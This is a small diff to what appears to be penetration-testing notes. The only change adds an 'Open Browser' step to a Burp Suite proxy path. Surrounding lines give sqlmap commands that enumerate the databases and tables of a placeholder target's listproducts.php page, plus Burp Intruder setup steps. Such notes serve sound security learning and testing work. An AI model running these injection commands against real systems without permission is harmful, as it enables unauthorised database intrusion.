@@ -42,7 +42,7 @@ $sqlmap -u http://Target_IP/listproducts.php?cat=1 –-dbs
 
 $sqlmap -u  http://Target_IP/listproducts.php?cat=1 –-dbs -D products –-tables
 
-Burp Suite > Proxy > Intercept > Intercept on
+Burp Suite > Proxy > Intercept > Open Browser > Intercept on
 
 Burp Suite > Intruder > Sniper attack > Positions Add > Payload Type = Simple list
 
